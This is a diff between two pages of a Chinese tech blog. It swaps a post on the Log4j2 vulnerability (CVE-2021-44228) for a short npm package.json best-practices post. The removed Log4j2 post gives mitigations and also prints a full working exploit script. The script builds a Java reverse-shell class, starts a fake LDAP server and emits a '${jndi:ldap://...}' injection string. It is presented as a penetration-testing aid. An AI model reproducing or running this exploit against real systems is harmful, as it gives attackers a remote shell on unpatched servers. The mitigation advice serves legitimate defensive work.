@@ -3,7 +3,7 @@
 <meta name="viewport" content="width=device-width">
 
 
-<title>Log4j2 原理、漏洞应对与缓解方案 | 小明的技术博客</title>
+<title>npm最佳实践 | 小明的技术博客</title>
 
 <meta name="generator" content="Hugo Eureka 0.8.4" />
 <link rel="stylesheet" href="/css/eureka.min.css">
@@ -55,9 +55,8 @@
 <link rel="apple-touch-icon" sizes="180x180" href="/images/icon_hu64421c6c7700f606f0ad45d807017b09_5843_180x180_fill_box_center_3.png">
 
 <meta name="description"
-  content="log4j漏洞介绍
-阿里巴巴长亭科技发现Apache Log4j2反序列化远程代码执行漏洞（CVE-2021-44228），随后更多细节被公开，攻击者可利用该漏洞构造恶意请求，触发远程代码执行，
-由于log4j2的异步快速等优异特性，打日志对生产服务影响很小，国内外很多java服务器组件使用了,造成广泛影响。">
+  content="发布到私有仓库 package.json 配置
+directories.bin 指定bin的目录 directories.lib 指定bin的lib位置 package.json的内容中 { //指定发布仓库 &quot;publishConfig&quot;: { &quot;registry&quot;: &quot;https://registry.npmjs.org/&quot; }, //指定引擎版本 &quot;engines&quot;: { &quot;node&quot;: &quot;&gt;= 8.0.0&quot;, &quot;npm&quot;: &quot;&gt;= 5.0.0&quot; }, //依赖有多种指定方式,可以是git，也可以是gz,也可以是本地路径 &quot;dependencies&quot;: { &quot;local&quot;: &quot;file://Users/xiaoming/example.gz&quot;, &quot;example&quot;: &quot;http://w.cc/visionmedia/example.gz&quot;, &quot;express&quot;: &quot;git://w.cc/visionmedia/express&quot;, &quot;b&quot;:&quot;git&#43;ssh://user@hostname:project.git#commit-ish&quot;, &quot;c&quot;:&quot;git&#43;https://user@hostname:project.git#commit-ish&quot;, &quot;mocha&quot;: &quot;visionmedia/mocha#4727d357ea&quot; } }  ">
 <script type="application/ld+json">
 {
   "@context": "https://schema.org",
@@ -69,8 +68,8 @@
       "item":"/posts/"},{
       "@type": "ListItem",
       "position": 2 ,
-      "name":"Log4j2 原理、漏洞应对与缓解方案",
-      "item":"/posts/security/log4j2-vulnerability-solution/"}]
+      "name":"npm最佳实践",
+      "item":"/posts/develop/npm-webpack-vite-yarn/npm-package/"}]
 }
 </script>
 
@@ -82,11 +81,11 @@
     "@type": "Article",
     "mainEntityOfPage": {
         "@type": "WebPage",
-        "@id": "/posts/security/log4j2-vulnerability-solution/"
+        "@id": "/posts/develop/npm-webpack-vite-yarn/npm-package/"
     },
-    "headline": "Log4j2 原理、漏洞应对与缓解方案 | 小明的技术博客","datePublished": "2021-12-25T19:56:07+08:00",
+    "headline": "npm最佳实践 | 小明的技术博客","datePublished": "2021-12-25T19:56:07+08:00",
     "dateModified": "2021-12-25T19:56:07+08:00",
-    "wordCount":  359 ,
+    "wordCount":  40 ,
     "publisher": {
         "@type": "Person",
         "name": "C. Wang",
@@ -95,23 +94,22 @@
             "url": "/images/icon.png"
         }
         },
-    "description": "\u003ch2 id=\u0022log4j漏洞介绍\u0022\u003elog4j漏洞介绍\u003c\/h2\u003e\n\u003cp\u003e阿里巴巴长亭科技发现Apache Log4j2反序列化远程代码执行漏洞（CVE-2021-44228），随后更多细节被公开，攻击者可利用该漏洞构造恶意请求，触发远程代码执行，\n由于log4j2的异步快速等优异特性，打日志对生产服务影响很小，国内外很多java服务器组件使用了,造成广泛影响。\u003c\/p\u003e"
+    "description": "发布到私有仓库 package.json 配置\ndirectories.bin 指定bin的目录 directories.lib 指定bin的lib位置 package.json的内容中 { \/\/指定发布仓库 \u0026quot;publishConfig\u0026quot;: { \u0026quot;registry\u0026quot;: \u0026quot;https:\/\/registry.npmjs.org\/\u0026quot; }, \/\/指定引擎版本 \u0026quot;engines\u0026quot;: { \u0026quot;node\u0026quot;: \u0026quot;\u0026gt;= 8.0.0\u0026quot;, \u0026quot;npm\u0026quot;: \u0026quot;\u0026gt;= 5.0.0\u0026quot; }, \/\/依赖有多种指定方式,可以是git，也可以是gz,也可以是本地路径 \u0026quot;dependencies\u0026quot;: { \u0026quot;local\u0026quot;: \u0026quot;file:\/\/Users\/xiaoming\/example.gz\u0026quot;, \u0026quot;example\u0026quot;: \u0026quot;http:\/\/w.cc\/visionmedia\/example.gz\u0026quot;, \u0026quot;express\u0026quot;: \u0026quot;git:\/\/w.cc\/visionmedia\/express\u0026quot;, \u0026quot;b\u0026quot;:\u0026quot;git\u002bssh:\/\/user@hostname:project.git#commit-ish\u0026quot;, \u0026quot;c\u0026quot;:\u0026quot;git\u002bhttps:\/\/user@hostname:project.git#commit-ish\u0026quot;, \u0026quot;mocha\u0026quot;: \u0026quot;visionmedia\/mocha#4727d357ea\u0026quot; } }  "
 }
-</script><meta property="og:title" content="Log4j2 原理、漏洞应对与缓解方案 | 小明的技术博客" />
+</script><meta property="og:title" content="npm最佳实践 | 小明的技术博客" />
 <meta property="og:type" content="article" />
 
 
 <meta property="og:image" content="/images/icon.png">
 
 
-<meta property="og:url" content="/posts/security/log4j2-vulnerability-solution/" />
+<meta property="og:url" content="/posts/develop/npm-webpack-vite-yarn/npm-package/" />
 
 
 
 
-<meta property="og:description" content="log4j漏洞介绍
-阿里巴巴长亭科技发现Apache Log4j2反序列化远程代码执行漏洞（CVE-2021-44228），随后更多细节被公开，攻击者可利用该漏洞构造恶意请求，触发远程代码执行，
-由于log4j2的异步快速等优异特性，打日志对生产服务影响很小，国内外很多java服务器组件使用了,造成广泛影响。" />
+<meta property="og:description" content="发布到私有仓库 package.json 配置
+directories.bin 指定bin的目录 directories.lib 指定bin的lib位置 package.json的内容中 { //指定发布仓库 &quot;publishConfig&quot;: { &quot;registry&quot;: &quot;https://registry.npmjs.org/&quot; }, //指定引擎版本 &quot;engines&quot;: { &quot;node&quot;: &quot;&gt;= 8.0.0&quot;, &quot;npm&quot;: &quot;&gt;= 5.0.0&quot; }, //依赖有多种指定方式,可以是git，也可以是gz,也可以是本地路径 &quot;dependencies&quot;: { &quot;local&quot;: &quot;file://Users/xiaoming/example.gz&quot;, &quot;example&quot;: &quot;http://w.cc/visionmedia/example.gz&quot;, &quot;express&quot;: &quot;git://w.cc/visionmedia/express&quot;, &quot;b&quot;:&quot;git&#43;ssh://user@hostname:project.git#commit-ish&quot;, &quot;c&quot;:&quot;git&#43;https://user@hostname:project.git#commit-ish&quot;, &quot;mocha&quot;: &quot;visionmedia/mocha#4727d357ea&quot; } }  " />
 
 
 
@@ -138,7 +136,7 @@
 <meta property="article:section" content="posts" />
 
 
-<meta property="article:tag" content="log4j2,漏洞,安全" />
+<meta property="article:tag" content="npm,前端打包,前端,最佳实践" />
 
 
 
@@ -217,7 +215,7 @@
 <div class="grid grid-cols-2 lg:grid-cols-8 gap-4 lg:pt-12">
     <div
         class="col-span-2 lg:col-start-2 lg:col-span-6 bg-secondary-bg rounded px-6 py-8">
-        <h1 class="font-bold text-3xl text-primary-text">Log4j2 原理、漏洞应对与缓解方案</h1>
+        <h1 class="font-bold text-3xl text-primary-text">npm最佳实践</h1>
         <div class="flex flex-wrap flex-row items-center mt-2 text-tertiary-text">
     <div class="mr-6 my-2">
         <i class="fas fa-calendar mr-1"></i>
@@ -225,7 +223,7 @@
     </div>
     <div class="mr-6 my-2">
         <i class="fas fa-clock mr-1"></i>
-        <span>2分钟阅读时长</span>
+        <span>1分钟阅读时长</span>
     </div>
     
     
@@ -237,184 +235,40 @@
         
 
         <div class="content">
-            <h2 id="log4j漏洞介绍">log4j漏洞介绍</h2>
-<p>阿里巴巴长亭科技发现Apache Log4j2反序列化远程代码执行漏洞（CVE-2021-44228），随后更多细节被公开，攻击者可利用该漏洞构造恶意请求，触发远程代码执行，
-由于log4j2的异步快速等优异特性，打日志对生产服务影响很小，国内外很多java服务器组件使用了,造成广泛影响。</p>
-<h2 id="解决办法">解决办法</h2>
-<h3 id="1-缓解办法">1. 缓解办法</h3>
-<h4 id="a-公司内部防火墙禁止服务器发起外网链接需要链接的进行打补丁后特别的开放">a. 公司内部防火墙，禁止服务器发起外网链接,需要链接的进行打补丁后,特别的开放</h4>
-<h4 id="b-火绒热补丁">b. 火绒热补丁</h4>
-<p>火绒热补丁，解决了，有些生产环境的服务器，不方便重启。</p>
-<blockquote>
-<p>借助JVM的Attach机制, 将缓解代码注入运行中的目标JVM进程, 再使用ASM修改JVM中的org.apache.logging.log4j.core.lookup.JndiLookup方法的字节码, 达到无需重启禁用JndiLookup::lookup的目的.</p>
-</blockquote>
-<p>也可以使用长亭科技提供的修复
-参照https://github.com/zhangyoufu/log4j2-without-jndi.git</p>
-<h4 id="c-添加服务器参数使用下列方法之一">c. 添加服务器参数,使用下列方法之一</h4>
-<ol>
-<li>
-<p>添加 &ldquo;log4j2.component.properties&rdquo; 文件，在里面增加配置 &ldquo;log4j2.formatMsgNoLookups=true&rdquo;</p>
-</li>
-<li>
-<p>添加JVM启动参数 -Dlog4j2.formatMsgNoLookups=true</p>
-</li>
-<li>
-<p>修改系统环境变量: FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS设置为true</p>
-</li>
-</ol>
-<h3 id="2-一劳永逸解决办法">2. 一劳永逸解决办法</h3>
-<h4 id="升级系统到log4j2-217最新版本">升级系统到log4j2 2.17最新版本</h4>
-<h3 id="3-对于安全测试人员运维人员如何发现公司哪些服务器有log4j2的漏洞可以使用log4j2的漏洞扫描工具">3. 对于安全测试人员，运维人员如何发现公司哪些服务器有log4j2的漏洞,可以使用log4j2的漏洞扫描工具</h3>
-<p>a. 使用长亭洞鉴（X-Ray）通过模拟浏览器爬虫，对资产进行精细化爬取，以攻击者视角深入挖掘互联网侧暴露的相关组件的Apache Log4j2远程代码执行漏洞</p>
-<h3 id="4-对于安全测试人员执行漏洞渗透测试">4. 对于安全测试人员，执行漏洞渗透测试</h3>
-<p>使用以下代码进行远程代码执行</p>
-<pre><code class="language-python"># Remote Code Execution (RCE)
-# Date: 11/12/2021
-# Software Link: https://github.com/apache/logging-log4j2
-# Version: versions 2.0-beta-9 and 2.14.1.
-# Tested on: Linux
-# CVE: CVE-2021-44228
-import subprocess
-import sys
-import argparse
-from colorama import Fore, init
-import subprocess
-import threading
+            <h3 id="发布到私有仓库">发布到私有仓库</h3>
+<p>package.json 配置</p>
+<pre><code class="language-js">directories.bin 指定bin的目录
+directories.lib 指定bin的lib位置
 
-from http.server import HTTPServer, SimpleHTTPRequestHandler
-
-init(autoreset=True)
-
-def listToString(s):
-str1 = &quot;&quot;
-try:
-for ele in s:
-str1 += ele
-return str1
-except Exception as ex:
-parser.print_help()
-sys.exit()
-
-def payload(userip , webport , lport):
-
-genExploit = (
-&quot;&quot;&quot;
-import java.io.IOException;
-import java.io.InputStream;
-import java.io.OutputStream;
-import java.net.Socket;
-
-public class Exploit {
-
-public Exploit() throws Exception {
-String host=&quot;%s&quot;;
-int port=%s;
-String cmd=&quot;/bin/sh&quot;;
-Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
-Socket s=new Socket(host,port);
-InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
-OutputStream po=p.getOutputStream(),so=s.getOutputStream();
-while(!s.isClosed()) {
-while(pi.available()&gt;0)
-so.write(pi.read());
-while(pe.available()&gt;0)
-so.write(pe.read());
-while(si.available()&gt;0)
-po.write(si.read());
-so.flush();
-po.flush();
-Thread.sleep(50);
-try {
-p.exitValue();
-break;
+package.json的内容中
+{
+    //指定发布仓库
+  &quot;publishConfig&quot;: {
+      &quot;registry&quot;: &quot;https://registry.npmjs.org/&quot;
+   },
+     //指定引擎版本
+   &quot;engines&quot;: {
+    &quot;node&quot;: &quot;&gt;= 8.0.0&quot;,
+    &quot;npm&quot;: &quot;&gt;= 5.0.0&quot;
+  	},
+    //依赖有多种指定方式,可以是git，也可以是gz,也可以是本地路径
+    &quot;dependencies&quot;: {
+        &quot;local&quot;: &quot;file://Users/xiaoming/example.gz&quot;,
+        &quot;example&quot;: &quot;http://w.cc/visionmedia/example.gz&quot;,
+        &quot;express&quot;: &quot;git://w.cc/visionmedia/express&quot;,
+        &quot;b&quot;:&quot;git+ssh://user@hostname:project.git#commit-ish&quot;,
+        &quot;c&quot;:&quot;git+https://user@hostname:project.git#commit-ish&quot;,
+        &quot;mocha&quot;: &quot;visionmedia/mocha#4727d357ea&quot;
+    }
 }
-catch (Exception e){
-}
-};
-p.destroy();
-s.close();
-}
-}
-&quot;&quot;&quot;) % (userip, lport)
 
-# writing the exploit to Exploit.java file
-
-try:
-f = open(&quot;Exploit.java&quot;, &quot;w&quot;)
-f.write(genExploit)
-f.close()
-print(Fore.GREEN + '[+] Exploit java class created success')
-
-except Exception as e:
-print(Fore.RED + f'[-] Something went wrong {e.toString()}')
-
-checkJavaAvailible()
-print(Fore.GREEN + '[+] Setting up fake LDAP server\n')
-
-# create the LDAP server on new thread
-t1 = threading.Thread(target=createLdapServer, args=(userip,webport))
-t1.start()
-
-# start the web server
-
-httpd = HTTPServer(('localhost', int(webport)), SimpleHTTPRequestHandler)
-httpd.serve_forever()
-
-def checkJavaAvailible():
-javaver = subprocess.call(['./jdk1.8.0_20/bin/java', '-version'], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
-if(javaver != 0):
-print(Fore.RED + '[-] Java is not installed inside the repository ')
-sys.exit()
-
-def createLdapServer(userip, lport):
-sendme = (&quot;${jndi:ldap://%s:1389/a}&quot;) % (userip)
-print(Fore.GREEN +&quot;[+] Send me: &quot;+sendme+&quot;\n&quot;)
-
-subprocess.run([&quot;./jdk1.8.0_20/bin/javac&quot;, &quot;Exploit.java&quot;])
-
-url = &quot;
-http://{}:{}/#Exploit&quot;.format
-(userip, lport)
-subprocess.run([&quot;./jdk1.8.0_20/bin/java&quot;, &quot;-cp&quot;,
-&quot;target/marshalsec-0.0.3-SNAPSHOT-all.jar&quot;, &quot;marshalsec.jndi.LDAPRefServer&quot;, url])
-
-def header():
-print(Fore.BLUE+&quot;&quot;&quot;
-[!] CVE: CVE-2021-44228
-[!] Github repo:
-https://github.com/kozmer/log4j-shell-poc
-&quot;&quot;&quot;)
-
-if __name__ == &quot;__main__&quot;:
-header()
-
-try:
-parser = argparse.ArgumentParser(description='please enter the values ')
-
-parser.add_argument('--userip', metavar='userip', type=str,
-nargs='+', help='Enter IP for LDAPRefServer &amp; Shell')
-
-parser.add_argument('--webport', metavar='webport', type=str,
-nargs='+', help='listener port for HTTP port')
-
-parser.add_argument('--lport', metavar='lport', type=str,
-nargs='+', help='Netcat Port')
-
-args = parser.parse_args()
-
-#print(args.userip)
-
-payload(listToString(args.userip), listToString(args.webport), listToString(args.lport))
-
-except KeyboardInterrupt:
-print(Fore.RED + &quot;user interupted the program.&quot;)
-sys.exit(0)
 </code></pre>
+
         </div>
         
         <div class="my-4">
     
-    <a href="/tags/log4j2%E6%BC%8F%E6%B4%9E%E5%AE%89%E5%85%A8/" class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 mr-2 hover:text-eureka">#log4j2,漏洞,安全</a>
+    <a href="/tags/npm%E5%89%8D%E7%AB%AF%E6%89%93%E5%8C%85%E5%89%8D%E7%AB%AF%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/" class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 mr-2 hover:text-eureka">#npm,前端打包,前端,最佳实践</a>
     
 </div>
         
@@ -429,11 +283,14 @@ sys.exit(0)
 <div class="flex flex-col md:flex-row md:justify-between -mx-2 mt-4 px-2 pt-4 border-t">
     <div>
         
+        <span class="block font-bold">上一页</span>
+        <a href="/posts/security/log4j2-vulnerability-solution/" class="block">Log4j2 原理、漏洞应对与缓解方案</a>
+        
     </div>
     <div class="md:text-right mt-4 md:mt-0">
         
         <span class="block font-bold">下一页</span>
-        <a href="/posts/develop/npm-webpack-vite-yarn/npm-package/" class="block">npm最佳实践</a>
+        <a href="/posts/develop/markdown/emoji-support/" class="block">支持emoji表情</a>
         
     </div>
 </div>
